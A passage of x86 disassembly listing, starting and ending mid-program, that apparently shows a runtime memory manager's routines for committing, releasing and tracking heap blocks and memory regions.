  40161c:	76 04                	jbe    0x401622
  40161e:	8b 7c 24 08          	mov    0x8(%esp),%edi
  401622:	3b fb                	cmp    %ebx,%edi
  401624:	76 1e                	jbe    0x401644
  401626:	6a 04                	push   $0x4
  401628:	68 00 10 00 00       	push   $0x1000
  40162d:	2b fb                	sub    %ebx,%edi
  40162f:	57                   	push   %edi
  401630:	53                   	push   %ebx
  401631:	e8 26 fc ff ff       	call   0x40125c
  401636:	85 c0                	test   %eax,%eax
  401638:	75 0a                	jne    0x401644
  40163a:	8b 44 24 04          	mov    0x4(%esp),%eax
  40163e:	33 d2                	xor    %edx,%edx
  401640:	89 10                	mov    %edx,(%eax)
  401642:	eb 0a                	jmp    0x40164e
  401644:	8b 36                	mov    (%esi),%esi
  401646:	81 fe 3c c4 40 00    	cmp    $0x40c43c,%esi
  40164c:	75 bc                	jne    0x40160a
  40164e:	83 c4 0c             	add    $0xc,%esp
  401651:	5d                   	pop    %ebp
  401652:	5f                   	pop    %edi
  401653:	5e                   	pop    %esi
  401654:	5b                   	pop    %ebx
  401655:	c3                   	ret
  401656:	8b c0                	mov    %eax,%eax
  401658:	53                   	push   %ebx
  401659:	56                   	push   %esi
  40165a:	57                   	push   %edi
  40165b:	55                   	push   %ebp
  40165c:	51                   	push   %ecx
  40165d:	8b d8                	mov    %eax,%ebx
  40165f:	8b f3                	mov    %ebx,%esi
  401661:	81 c6 ff 0f 00 00    	add    $0xfff,%esi
  401667:	81 e6 00 f0 ff ff    	and    $0xfffff000,%esi
  40166d:	89 34 24             	mov    %esi,(%esp)
  401670:	8b eb                	mov    %ebx,%ebp
  401672:	03 ea                	add    %edx,%ebp
  401674:	81 e5 00 f0 ff ff    	and    $0xfffff000,%ebp
  40167a:	8b 04 24             	mov    (%esp),%eax
  40167d:	89 01                	mov    %eax,(%ecx)
  40167f:	8b c5                	mov    %ebp,%eax
  401681:	2b 04 24             	sub    (%esp),%eax
  401684:	89 41 04             	mov    %eax,0x4(%ecx)
  401687:	8b 35 3c c4 40 00    	mov    0x40c43c,%esi
  40168d:	eb 38                	jmp    0x4016c7
  40168f:	8b 5e 08             	mov    0x8(%esi),%ebx
  401692:	8b 7e 0c             	mov    0xc(%esi),%edi
  401695:	03 fb                	add    %ebx,%edi
  401697:	3b 1c 24             	cmp    (%esp),%ebx
  40169a:	73 03                	jae    0x40169f
  40169c:	8b 1c 24             	mov    (%esp),%ebx
  40169f:	3b ef                	cmp    %edi,%ebp
  4016a1:	73 02                	jae    0x4016a5
  4016a3:	8b fd                	mov    %ebp,%edi
  4016a5:	3b fb                	cmp    %ebx,%edi
  4016a7:	76 1c                	jbe    0x4016c5
  4016a9:	68 00 40 00 00       	push   $0x4000
  4016ae:	2b fb                	sub    %ebx,%edi
  4016b0:	57                   	push   %edi
  4016b1:	53                   	push   %ebx
  4016b2:	e8 ad fb ff ff       	call   0x401264
  4016b7:	85 c0                	test   %eax,%eax
  4016b9:	75 0a                	jne    0x4016c5
  4016bb:	c7 05 18 c4 40 00 02 	movl   $0x2,0x40c418
  4016c2:	00 00 00 
  4016c5:	8b 36                	mov    (%esi),%esi
  4016c7:	81 fe 3c c4 40 00    	cmp    $0x40c43c,%esi
  4016cd:	75 c0                	jne    0x40168f
  4016cf:	5a                   	pop    %edx
  4016d0:	5d                   	pop    %ebp
  4016d1:	5f                   	pop    %edi
  4016d2:	5e                   	pop    %esi
  4016d3:	5b                   	pop    %ebx
  4016d4:	c3                   	ret
  4016d5:	8d 40 00             	lea    0x0(%eax),%eax
  4016d8:	53                   	push   %ebx
  4016d9:	56                   	push   %esi
  4016da:	57                   	push   %edi
  4016db:	55                   	push   %ebp
  4016dc:	83 c4 f8             	add    $0xfffffff8,%esp
  4016df:	8b f2                	mov    %edx,%esi
  4016e1:	8b f8                	mov    %eax,%edi
  4016e3:	bd 4c c4 40 00       	mov    $0x40c44c,%ebp
  4016e8:	81 c7 ff 3f 00 00    	add    $0x3fff,%edi
  4016ee:	81 e7 00 c0 ff ff    	and    $0xffffc000,%edi
  4016f4:	8b 5d 00             	mov    0x0(%ebp),%ebx
  4016f7:	eb 33                	jmp    0x40172c
  4016f9:	3b 7b 0c             	cmp    0xc(%ebx),%edi
  4016fc:	7f 2c                	jg     0x40172a
  4016fe:	8b ce                	mov    %esi,%ecx
  401700:	8b d7                	mov    %edi,%edx
  401702:	8b 43 08             	mov    0x8(%ebx),%eax
  401705:	e8 ba fe ff ff       	call   0x4015c4
  40170a:	83 3e 00             	cmpl   $0x0,(%esi)
  40170d:	74 50                	je     0x40175f
  40170f:	8b 46 04             	mov    0x4(%esi),%eax
  401712:	01 43 08             	add    %eax,0x8(%ebx)
  401715:	8b 46 04             	mov    0x4(%esi),%eax
  401718:	29 43 0c             	sub    %eax,0xc(%ebx)
  40171b:	83 7b 0c 00          	cmpl   $0x0,0xc(%ebx)
  40171f:	75 3e                	jne    0x40175f
  401721:	8b c3                	mov    %ebx,%eax
  401723:	e8 ec fb ff ff       	call   0x401314
  401728:	eb 35                	jmp    0x40175f
  40172a:	8b 1b                	mov    (%ebx),%ebx
  40172c:	3b dd                	cmp    %ebp,%ebx
  40172e:	75 c9                	jne    0x4016f9
  401730:	8b d6                	mov    %esi,%edx
  401732:	8b c7                	mov    %edi,%eax
  401734:	e8 f7 fc ff ff       	call   0x401430
  401739:	83 3e 00             	cmpl   $0x0,(%esi)
  40173c:	74 21                	je     0x40175f
  40173e:	8b cc                	mov    %esp,%ecx
  401740:	8b d6                	mov    %esi,%edx
  401742:	8b c5                	mov    %ebp,%eax
  401744:	e8 e3 fb ff ff       	call   0x40132c
  401749:	83 3c 24 00          	cmpl   $0x0,(%esp)
  40174d:	75 a5                	jne    0x4016f4
  40174f:	8b cc                	mov    %esp,%ecx
  401751:	8b 56 04             	mov    0x4(%esi),%edx
  401754:	8b 06                	mov    (%esi),%eax
  401756:	e8 b1 fd ff ff       	call   0x40150c
  40175b:	33 c0                	xor    %eax,%eax
  40175d:	89 06                	mov    %eax,(%esi)
  40175f:	59                   	pop    %ecx
  401760:	5a                   	pop    %edx
  401761:	5d                   	pop    %ebp
  401762:	5f                   	pop    %edi
  401763:	5e                   	pop    %esi
  401764:	5b                   	pop    %ebx
  401765:	c3                   	ret
  401766:	8b c0                	mov    %eax,%eax
  401768:	53                   	push   %ebx
  401769:	56                   	push   %esi
  40176a:	57                   	push   %edi
  40176b:	55                   	push   %ebp
  40176c:	83 c4 ec             	add    $0xffffffec,%esp
  40176f:	89 0c 24             	mov    %ecx,(%esp)
  401772:	8b fa                	mov    %edx,%edi
  401774:	8b f0                	mov    %eax,%esi
  401776:	bd 4c c4 40 00       	mov    $0x40c44c,%ebp
  40177b:	81 c7 ff 3f 00 00    	add    $0x3fff,%edi
  401781:	81 e7 00 c0 ff ff    	and    $0xffffc000,%edi
  401787:	8b 5d 00             	mov    0x0(%ebp),%ebx
  40178a:	eb 02                	jmp    0x40178e
  40178c:	8b 1b                	mov    (%ebx),%ebx
  40178e:	3b dd                	cmp    %ebp,%ebx
  401790:	74 05                	je     0x401797
  401792:	3b 73 08             	cmp    0x8(%ebx),%esi
  401795:	75 f5                	jne    0x40178c
  401797:	3b 73 08             	cmp    0x8(%ebx),%esi
  40179a:	75 57                	jne    0x4017f3
  40179c:	3b 7b 0c             	cmp    0xc(%ebx),%edi
  40179f:	0f 8e 96 00 00 00    	jle    0x40183b
  4017a5:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  4017a9:	8b d7                	mov    %edi,%edx
  4017ab:	2b 53 0c             	sub    0xc(%ebx),%edx
  4017ae:	8b 43 08             	mov    0x8(%ebx),%eax
  4017b1:	03 43 0c             	add    0xc(%ebx),%eax
  4017b4:	e8 db fc ff ff       	call   0x401494
  4017b9:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  4017be:	74 33                	je     0x4017f3
  4017c0:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  4017c4:	8d 54 24 04          	lea    0x4(%esp),%edx
  4017c8:	8b c5                	mov    %ebp,%eax
  4017ca:	e8 5d fb ff ff       	call   0x40132c
  4017cf:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4017d4:	75 b1                	jne    0x401787
  4017d6:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  4017da:	8b 54 24 08          	mov    0x8(%esp),%edx
  4017de:	8b 44 24 04          	mov    0x4(%esp),%eax
  4017e2:	e8 25 fd ff ff       	call   0x40150c
  4017e7:	8b 04 24             	mov    (%esp),%eax
  4017ea:	33 d2                	xor    %edx,%edx
  4017ec:	89 10                	mov    %edx,(%eax)
  4017ee:	e9 90 00 00 00       	jmp    0x401883
  4017f3:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  4017f7:	8b d7                	mov    %edi,%edx
  4017f9:	8b c6                	mov    %esi,%eax
  4017fb:	e8 94 fc ff ff       	call   0x401494
  401800:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  401805:	74 34                	je     0x40183b
  401807:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  40180b:	8d 54 24 04          	lea    0x4(%esp),%edx
  40180f:	8b c5                	mov    %ebp,%eax
  401811:	e8 16 fb ff ff       	call   0x40132c
  401816:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  40181b:	0f 85 66 ff ff ff    	jne    0x401787
  401821:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  401825:	8b 54 24 08          	mov    0x8(%esp),%edx
  401829:	8b 44 24 04          	mov    0x4(%esp),%eax
  40182d:	e8 da fc ff ff       	call   0x40150c
  401832:	8b 04 24             	mov    (%esp),%eax
  401835:	33 d2                	xor    %edx,%edx
  401837:	89 10                	mov    %edx,(%eax)
  401839:	eb 48                	jmp    0x401883
  40183b:	8b 6b 08             	mov    0x8(%ebx),%ebp
  40183e:	3b f5                	cmp    %ebp,%esi
  401840:	75 3a                	jne    0x40187c
  401842:	3b 7b 0c             	cmp    0xc(%ebx),%edi
  401845:	7f 35                	jg     0x40187c
  401847:	8b 0c 24             	mov    (%esp),%ecx
  40184a:	8b d7                	mov    %edi,%edx
  40184c:	8b c5                	mov    %ebp,%eax
  40184e:	e8 71 fd ff ff       	call   0x4015c4
  401853:	8b 04 24             	mov    (%esp),%eax
  401856:	83 38 00             	cmpl   $0x0,(%eax)
  401859:	74 28                	je     0x401883
  40185b:	8b 04 24             	mov    (%esp),%eax
  40185e:	8b 40 04             	mov    0x4(%eax),%eax
  401861:	01 43 08             	add    %eax,0x8(%ebx)
  401864:	8b 04 24             	mov    (%esp),%eax
  401867:	8b 40 04             	mov    0x4(%eax),%eax
  40186a:	29 43 0c             	sub    %eax,0xc(%ebx)
  40186d:	83 7b 0c 00          	cmpl   $0x0,0xc(%ebx)
  401871:	75 10                	jne    0x401883
  401873:	8b c3                	mov    %ebx,%eax
  401875:	e8 9a fa ff ff       	call   0x401314
  40187a:	eb 07                	jmp    0x401883
  40187c:	8b 04 24             	mov    (%esp),%eax
  40187f:	33 d2                	xor    %edx,%edx
  401881:	89 10                	mov    %edx,(%eax)
  401883:	83 c4 14             	add    $0x14,%esp
  401886:	5d                   	pop    %ebp
  401887:	5f                   	pop    %edi
  401888:	5e                   	pop    %esi
  401889:	5b                   	pop    %ebx
  40188a:	c3                   	ret
  40188b:	90                   	nop
  40188c:	53                   	push   %ebx
  40188d:	56                   	push   %esi
  40188e:	57                   	push   %edi
  40188f:	83 c4 ec             	add    $0xffffffec,%esp
  401892:	8b f9                	mov    %ecx,%edi
  401894:	89 14 24             	mov    %edx,(%esp)
  401897:	8d 98 ff 3f 00 00    	lea    0x3fff(%eax),%ebx
  40189d:	81 e3 00 c0 ff ff    	and    $0xffffc000,%ebx
  4018a3:	8b 34 24             	mov    (%esp),%esi
  4018a6:	03 f0                	add    %eax,%esi
  4018a8:	81 e6 00 c0 ff ff    	and    $0xffffc000,%esi
  4018ae:	3b de                	cmp    %esi,%ebx
  4018b0:	73 5b                	jae    0x40190d
  4018b2:	8b cf                	mov    %edi,%ecx
  4018b4:	8b d6                	mov    %esi,%edx
  4018b6:	2b d3                	sub    %ebx,%edx
  4018b8:	8b c3                	mov    %ebx,%eax
  4018ba:	e8 99 fd ff ff       	call   0x401658
  4018bf:	8d 4c 24 04          	lea    0x4(%esp),%ecx
  4018c3:	8b d7                	mov    %edi,%edx
  4018c5:	b8 4c c4 40 00       	mov    $0x40c44c,%eax
  4018ca:	e8 5d fa ff ff       	call   0x40132c
  4018cf:	8b 5c 24 04          	mov    0x4(%esp),%ebx
  4018d3:	85 db                	test   %ebx,%ebx
  4018d5:	74 1f                	je     0x4018f6
  4018d7:	8d 4c 24 0c          	lea    0xc(%esp),%ecx
  4018db:	8b 54 24 08          	mov    0x8(%esp),%edx
  4018df:	8b c3                	mov    %ebx,%eax
  4018e1:	e8 26 fc ff ff       	call   0x40150c
  4018e6:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4018ea:	89 44 24 04          	mov    %eax,0x4(%esp)
  4018ee:	8b 44 24 10          	mov    0x10(%esp),%eax
  4018f2:	89 44 24 08          	mov    %eax,0x8(%esp)
  4018f6:	83 7c 24 04 00       	cmpl   $0x0,0x4(%esp)
  4018fb:	74 14                	je     0x401911
  4018fd:	8d 54 24 04          	lea    0x4(%esp),%edx
  401901:	b8 4c c4 40 00       	mov    $0x40c44c,%eax
  401906:	e8 95 fa ff ff       	call   0x4013a0
  40190b:	eb 04                	jmp    0x401911
  40190d:	33 c0                	xor    %eax,%eax
  40190f:	89 07                	mov    %eax,(%edi)
  401911:	83 c4 14             	add    $0x14,%esp
  401914:	5f                   	pop    %edi
  401915:	5e                   	pop    %esi
  401916:	5b                   	pop    %ebx
  401917:	c3                   	ret
  401918:	55                   	push   %ebp
  401919:	8b ec                	mov    %esp,%ebp
  40191b:	33 d2                	xor    %edx,%edx
  40191d:	55                   	push   %ebp
  40191e:	68 ce 19 40 00       	push   $0x4019ce
  401923:	64 ff 32             	push   %fs:(%edx)
  401926:	64 89 22             	mov    %esp,%fs:(%edx)
  401929:	68 1c c4 40 00       	push   $0x40c41c
  40192e:	e8 39 f9 ff ff       	call   0x40126c
  401933:	80 3d 32 c0 40 00 00 	cmpb   $0x0,0x40c032
  40193a:	74 0a                	je     0x401946
  40193c:	68 1c c4 40 00       	push   $0x40c41c
  401941:	e8 2e f9 ff ff       	call   0x401274
  401946:	b8 3c c4 40 00       	mov    $0x40c43c,%eax
  40194b:	e8 8c f9 ff ff       	call   0x4012dc
  401950:	b8 4c c4 40 00       	mov    $0x40c44c,%eax
  401955:	e8 82 f9 ff ff       	call   0x4012dc
  40195a:	b8 78 c4 40 00       	mov    $0x40c478,%eax
  40195f:	e8 78 f9 ff ff       	call   0x4012dc
  401964:	68 f8 0f 00 00       	push   $0xff8
  401969:	6a 00                	push   $0x0
  40196b:	e8 dc f8 ff ff       	call   0x40124c
  401970:	a3 74 c4 40 00       	mov    %eax,0x40c474
  401975:	83 3d 74 c4 40 00 00 	cmpl   $0x0,0x40c474
  40197c:	74 2f                	je     0x4019ad
  40197e:	b8 03 00 00 00       	mov    $0x3,%eax
  401983:	8b 15 74 c4 40 00    	mov    0x40c474,%edx
  401989:	33 c9                	xor    %ecx,%ecx
  40198b:	89 4c 82 f4          	mov    %ecx,-0xc(%edx,%eax,4)
  40198f:	40                   	inc    %eax
  401990:	3d 01 04 00 00       	cmp    $0x401,%eax
  401995:	75 ec                	jne    0x401983
  401997:	b8 5c c4 40 00       	mov    $0x40c45c,%eax
  40199c:	89 40 04             	mov    %eax,0x4(%eax)
  40199f:	89 00                	mov    %eax,(%eax)
  4019a1:	a3 68 c4 40 00       	mov    %eax,0x40c468
  4019a6:	c6 05 15 c4 40 00 01 	movb   $0x1,0x40c415
  4019ad:	33 c0                	xor    %eax,%eax
  4019af:	5a                   	pop    %edx
  4019b0:	59                   	pop    %ecx
  4019b1:	59                   	pop    %ecx
  4019b2:	64 89 10             	mov    %edx,%fs:(%eax)
  4019b5:	68 d5 19 40 00       	push   $0x4019d5
  4019ba:	80 3d 32 c0 40 00 00 	cmpb   $0x0,0x40c032
  4019c1:	74 0a                	je     0x4019cd
  4019c3:	68 1c c4 40 00       	push   $0x40c41c
  4019c8:	e8 af f8 ff ff       	call   0x40127c
  4019cd:	c3                   	ret
  4019ce:	e9 29 14 00 00       	jmp    0x402dfc
  4019d3:	eb e5                	jmp    0x4019ba
  4019d5:	a0 15 c4 40 00       	mov    0x40c415,%al
  4019da:	5d                   	pop    %ebp
  4019db:	c3                   	ret
  4019dc:	55                   	push   %ebp
  4019dd:	8b ec                	mov    %esp,%ebp
  4019df:	53                   	push   %ebx
  4019e0:	80 3d 15 c4 40 00 00 	cmpb   $0x0,0x40c415
  4019e7:	0f 84 ce 00 00 00    	je     0x401abb
  4019ed:	33 d2                	xor    %edx,%edx
  4019ef:	55                   	push   %ebp
  4019f0:	68 b4 1a 40 00       	push   $0x401ab4
  4019f5:	64 ff 32             	push   %fs:(%edx)
  4019f8:	64 89 22             	mov    %esp,%fs:(%edx)
  4019fb:	80 3d 32 c0 40 00 00 	cmpb   $0x0,0x40c032
  401a02:	74 0a                	je     0x401a0e
  401a04:	68 1c c4 40 00       	push   $0x40c41c
  401a09:	e8 66 f8 ff ff       	call   0x401274
  401a0e:	c6 05 15 c4 40 00 00 	movb   $0x0,0x40c415
  401a15:	a1 74 c4 40 00       	mov    0x40c474,%eax
  401a1a:	50                   	push   %eax
  401a1b:	e8 34 f8 ff ff       	call   0x401254
  401a20:	33 c0                	xor    %eax,%eax
  401a22:	a3 74 c4 40 00       	mov    %eax,0x40c474
  401a27:	8b 1d 3c c4 40 00    	mov    0x40c43c,%ebx
  401a2d:	eb 12                	jmp    0x401a41
  401a2f:	68 00 80 00 00       	push   $0x8000
  401a34:	6a 00                	push   $0x0
  401a36:	8b 43 08             	mov    0x8(%ebx),%eax
  401a39:	50                   	push   %eax
  401a3a:	e8 25 f8 ff ff       	call   0x401264
  401a3f:	8b 1b                	mov    (%ebx),%ebx
  401a41:	81 fb 3c c4 40 00    	cmp    $0x40c43c,%ebx
  401a47:	75 e6                	jne    0x401a2f
  401a49:	b8 3c c4 40 00       	mov    $0x40c43c,%eax
  401a4e:	e8 89 f8 ff ff       	call   0x4012dc
  401a53:	b8 4c c4 40 00       	mov    $0x40c44c,%eax
  401a58:	e8 7f f8 ff ff       	call   0x4012dc
  401a5d:	b8 78 c4 40 00       	mov    $0x40c478,%eax
  401a62:	e8 75 f8 ff ff       	call   0x4012dc
  401a67:	a1 34 c4 40 00       	mov    0x40c434,%eax
  401a6c:	85 c0                	test   %eax,%eax
  401a6e:	74 17                	je     0x401a87
  401a70:	8b 10                	mov    (%eax),%edx
  401a72:	89 15 34 c4 40 00    	mov    %edx,0x40c434
  401a78:	50                   	push   %eax
  401a79:	e8 d6 f7 ff ff       	call   0x401254
  401a7e:	a1 34 c4 40 00       	mov    0x40c434,%eax
  401a83:	85 c0                	test   %eax,%eax
  401a85:	75 e9                	jne    0x401a70
  401a87:	64 8f 05 00 00 00 00 	pop    %fs:0x0
  401a8e:	83 c4 08             	add    $0x8,%esp
  401a91:	68 bb 1a 40 00       	push   $0x401abb
  401a96:	80 3d 32 c0 40 00 00 	cmpb   $0x0,0x40c032
  401a9d:	74 0a                	je     0x401aa9
  401a9f:	68 1c c4 40 00       	push   $0x40c41c
  401aa4:	e8 d3 f7 ff ff       	call   0x40127c
  401aa9:	68 1c c4 40 00       	push   $0x40c41c
  401aae:	e8 d1 f7 ff ff       	call   0x401284
  401ab3:	c3                   	ret
  401ab4:	e9 43 13 00 00       	jmp    0x402dfc
  401ab9:	eb db                	jmp    0x401a96
  401abb:	5b                   	pop    %ebx
  401abc:	5d                   	pop    %ebp
  401abd:	c3                   	ret
  401abe:	8b c0                	mov    %eax,%eax
  401ac0:	53                   	push   %ebx
  401ac1:	3b 05 68 c4 40 00    	cmp    0x40c468,%eax
  401ac7:	75 09                	jne    0x401ad2
  401ac9:	8b 50 04             	mov    0x4(%eax),%edx
  401acc:	89 15 68 c4 40 00    	mov    %edx,0x40c468
  401ad2:	8b 50 04             	mov    0x4(%eax),%edx
  401ad5:	8b 48 08             	mov    0x8(%eax),%ecx
  401ad8:	81 f9 00 10 00 00    	cmp    $0x1000,%ecx
  401ade:	7f 2a                	jg     0x401b0a
  401ae0:	3b c2                	cmp    %edx,%eax
  401ae2:	75 10                	jne    0x401af4
  401ae4:	c1 e9 02             	shr    $0x2,%ecx
  401ae7:	a1 74 c4 40 00       	mov    0x40c474,%eax
  401aec:	33 d2                	xor    %edx,%edx
  401aee:	89 54 88 f4          	mov    %edx,-0xc(%eax,%ecx,4)
  401af2:	eb 1d                	jmp    0x401b11
  401af4:	c1 e9 02             	shr    $0x2,%ecx
  401af7:	8b 1d 74 c4 40 00    	mov    0x40c474,%ebx
  401afd:	89 54 8b f4          	mov    %edx,-0xc(%ebx,%ecx,4)
  401b01:	8b 00                	mov    (%eax),%eax
  401b03:	89 02                	mov    %eax,(%edx)
  401b05:	89 50 04             	mov    %edx,0x4(%eax)
  401b08:	5b                   	pop    %ebx
  401b09:	c3                   	ret
  401b0a:	8b 00                	mov    (%eax),%eax
  401b0c:	89 02                	mov    %eax,(%edx)
  401b0e:	89 50 04             	mov    %edx,0x4(%eax)
  401b11:	5b                   	pop    %ebx
  401b12:	c3                   	ret
  401b13:	90                   	nop
  401b14:	8b 15 78 c4 40 00    	mov    0x40c478,%edx
  401b1a:	eb 10                	jmp    0x401b2c
  401b1c:	8b 4a 08             	mov    0x8(%edx),%ecx
  401b1f:	3b c1                	cmp    %ecx,%eax
  401b21:	72 07                	jb     0x401b2a
  401b23:	03 4a 0c             	add    0xc(%edx),%ecx
  401b26:	3b c1                	cmp    %ecx,%eax
  401b28:	72 16                	jb     0x401b40
  401b2a:	8b 12                	mov    (%edx),%edx
  401b2c:	81 fa 78 c4 40 00    	cmp    $0x40c478,%edx
  401b32:	75 e8                	jne    0x401b1c
  401b34:	c7 05 18 c4 40 00 03 	movl   $0x3,0x40c418
  401b3b:	00 00 00 
  401b3e:	33 d2                	xor    %edx,%edx
  401b40:	8b c2                	mov    %edx,%eax
  401b42:	c3                   	ret
  401b43:	90                   	nop
  401b44:	53                   	push   %ebx
  401b45:	8b ca                	mov    %edx,%ecx
  401b47:	83 e9 04             	sub    $0x4,%ecx
  401b4a:	8d 1c 01             	lea    (%ecx,%eax,1),%ebx
  401b4d:	83 fa 10             	cmp    $0x10,%edx
  401b50:	7c 0f                	jl     0x401b61
  401b52:	c7 03 07 00 00 80    	movl   $0x80000007,(%ebx)
  401b58:	8b d1                	mov    %ecx,%edx
  401b5a:	e8 a1 01 00 00       	call   0x401d00
  401b5f:	5b                   	pop    %ebx
  401b60:	c3                   	ret
  401b61:	83 fa 04             	cmp    $0x4,%edx
  401b64:	7c 0c                	jl     0x401b72
  401b66:	8b ca                	mov    %edx,%ecx
  401b68:	81 c9 02 00 00 80    	or     $0x80000002,%ecx
  401b6e:	89 08                	mov    %ecx,(%eax)
  401b70:	89 0b                	mov    %ecx,(%ebx)
  401b72:	5b                   	pop    %ebx
  401b73:	c3                   	ret
  401b74:	ff 05 fc c3 40 00    	incl   0x40c3fc
  401b7a:	8b d0                	mov    %eax,%edx
  401b7c:	83 ea 04             	sub    $0x4,%edx
  401b7f:	8b 12                	mov    (%edx),%edx
  401b81:	81 e2 fc ff ff 7f    	and    $0x7ffffffc,%edx
  401b87:	83 ea 04             	sub    $0x4,%edx
  401b8a:	01 15 00 c4 40 00    	add    %edx,0x40c400
  401b90:	e8 c7 05 00 00       	call   0x40215c
  401b95:	c3                   	ret
  401b96:	8b c0                	mov    %eax,%eax
  401b98:	83 fa 0c             	cmp    $0xc,%edx
  401b9b:	7c 0e                	jl     0x401bab
  401b9d:	83 ca 02             	or     $0x2,%edx
  401ba0:	89 10                	mov    %edx,(%eax)
  401ba2:	83 c0 04             	add    $0x4,%eax
  401ba5:	e8 ca ff ff ff       	call   0x401b74
  401baa:	c3                   	ret
  401bab:	83 fa 04             	cmp    $0x4,%edx
  401bae:	7c 0a                	jl     0x401bba
  401bb0:	8b ca                	mov    %edx,%ecx
  401bb2:	81 c9 02 00 00 80    	or     $0x80000002,%ecx
  401bb8:	89 08                	mov    %ecx,(%eax)
  401bba:	03 c2                	add    %edx,%eax
  401bbc:	83 20 fe             	andl   $0xfffffffe,(%eax)
  401bbf:	c3                   	ret
  401bc0:	53                   	push   %ebx
  401bc1:	56                   	push   %esi
  401bc2:	8b d0                	mov    %eax,%edx
  401bc4:	83 ea 04             	sub    $0x4,%edx
  401bc7:	8b 12                	mov    (%edx),%edx
  401bc9:	8b ca                	mov    %edx,%ecx
  401bcb:	81 e1 02 00 00 80    	and    $0x80000002,%ecx
  401bd1:	81 f9 02 00 00 80    	cmp    $0x80000002,%ecx
  401bd7:	74 0a                	je     0x401be3
  401bd9:	c7 05 18 c4 40 00 04 	movl   $0x4,0x40c418
  401be0:	00 00 00 
  401be3:	8b da                	mov    %edx,%ebx
  401be5:	81 e3 fc ff ff 7f    	and    $0x7ffffffc,%ebx
  401beb:	2b c3                	sub    %ebx,%eax
  401bed:	8b c8                	mov    %eax,%ecx
  401bef:	33 11                	xor    (%ecx),%edx
  401bf1:	f7 c2 fe ff ff ff    	test   $0xfffffffe,%edx
  401bf7:	74 0a                	je     0x401c03
  401bf9:	c7 05 18 c4 40 00 05 	movl   $0x5,0x40c418
  401c00:	00 00 00 
  401c03:	f6 01 01             	testb  $0x1,(%ecx)
  401c06:	74 20                	je     0x401c28
  401c08:	8b d0                	mov    %eax,%edx
  401c0a:	83 ea 0c             	sub    $0xc,%edx
  401c0d:	8b 72 08             	mov    0x8(%edx),%esi
  401c10:	2b c6                	sub    %esi,%eax
  401c12:	3b 70 08             	cmp    0x8(%eax),%esi
  401c15:	74 0a                	je     0x401c21
  401c17:	c7 05 18 c4 40 00 06 	movl   $0x6,0x40c418
  401c1e:	00 00 00 
  401c21:	e8 9a fe ff ff       	call   0x401ac0
  401c26:	03 de                	add    %esi,%ebx
  401c28:	8b c3                	mov    %ebx,%eax
  401c2a:	5e                   	pop    %esi
  401c2b:	5b                   	pop    %ebx
  401c2c:	c3                   	ret
  401c2d:	8d 40 00             	lea    0x0(%eax),%eax
  401c30:	53                   	push   %ebx
  401c31:	56                   	push   %esi
  401c32:	57                   	push   %edi
  401c33:	8b d8                	mov    %eax,%ebx
  401c35:	33 ff                	xor    %edi,%edi
  401c37:	8b 03                	mov    (%ebx),%eax
  401c39:	a9 00 00 00 80       	test   $0x80000000,%eax
  401c3e:	74 0b                	je     0x401c4b
  401c40:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  401c45:	03 f8                	add    %eax,%edi
  401c47:	03 d8                	add    %eax,%ebx
  401c49:	8b 03                	mov    (%ebx),%eax
  401c4b:	a8 02                	test   $0x2,%al
  401c4d:	75 13                	jne    0x401c62
  401c4f:	8b f3                	mov    %ebx,%esi
  401c51:	8b c6                	mov    %esi,%eax
  401c53:	e8 68 fe ff ff       	call   0x401ac0
  401c58:	8b 46 08             	mov    0x8(%esi),%eax
  401c5b:	03 f8                	add    %eax,%edi
  401c5d:	03 d8                	add    %eax,%ebx
  401c5f:	83 23 fe             	andl   $0xfffffffe,(%ebx)
  401c62:	8b c7                	mov    %edi,%eax
  401c64:	5f                   	pop    %edi
  401c65:	5e                   	pop    %esi
  401c66:	5b                   	pop    %ebx
  401c67:	c3                   	ret
  401c68:	53                   	push   %ebx
  401c69:	56                   	push   %esi
  401c6a:	57                   	push   %edi
  401c6b:	55                   	push   %ebp
  401c6c:	83 c4 f8             	add    $0xfffffff8,%esp
  401c6f:	8b fa                	mov    %edx,%edi
  401c71:	8b f0                	mov    %eax,%esi
  401c73:	8b c6                	mov    %esi,%eax
  401c75:	e8 9a fe ff ff       	call   0x401b14
  401c7a:	8b d8                	mov    %eax,%ebx
  401c7c:	8b 6b 08             	mov    0x8(%ebx),%ebp
  401c7f:	8b c5                	mov    %ebp,%eax
  401c81:	03 43 0c             	add    0xc(%ebx),%eax
  401c84:	8b d0                	mov    %eax,%edx
  401c86:	8d 0c 37             	lea    (%edi,%esi,1),%ecx
  401c89:	2b d1                	sub    %ecx,%edx
  401c8b:	83 fa 0c             	cmp    $0xc,%edx
  401c8e:	7f 04                	jg     0x401c94
  401c90:	8b f8                	mov    %eax,%edi
  401c92:	2b fe                	sub    %esi,%edi
  401c94:	8b c6                	mov    %esi,%eax
  401c96:	2b c5                	sub    %ebp,%eax
  401c98:	83 f8 0c             	cmp    $0xc,%eax
  401c9b:	7d 12                	jge    0x401caf
  401c9d:	8b cc                	mov    %esp,%ecx
  401c9f:	8b d6                	mov    %esi,%edx
  401ca1:	2b 53 08             	sub    0x8(%ebx),%edx
  401ca4:	03 d7                	add    %edi,%edx
  401ca6:	8b c5                	mov    %ebp,%eax
  401ca8:	e8 df fb ff ff       	call   0x40188c
  401cad:	eb 0f                	jmp    0x401cbe
  401caf:	8b cc                	mov    %esp,%ecx
  401cb1:	8b d7                	mov    %edi,%edx
  401cb3:	83 ea 04             	sub    $0x4,%edx
  401cb6:	8d 46 04             	lea    0x4(%esi),%eax
  401cb9:	e8 ce fb ff ff       	call   0x40188c
  401cbe:	8b 2c 24             	mov    (%esp),%ebp
  401cc1:	85 ed                	test   %ebp,%ebp
  401cc3:	75 04                	jne    0x401cc9
  401cc5:	33 c0                	xor    %eax,%eax
  401cc7:	eb 30                	jmp    0x401cf9
  401cc9:	8b d5                	mov    %ebp,%edx
  401ccb:	2b d6                	sub    %esi,%edx
  401ccd:	8b c6                	mov    %esi,%eax
  401ccf:	e8 70 fe ff ff       	call   0x401b44
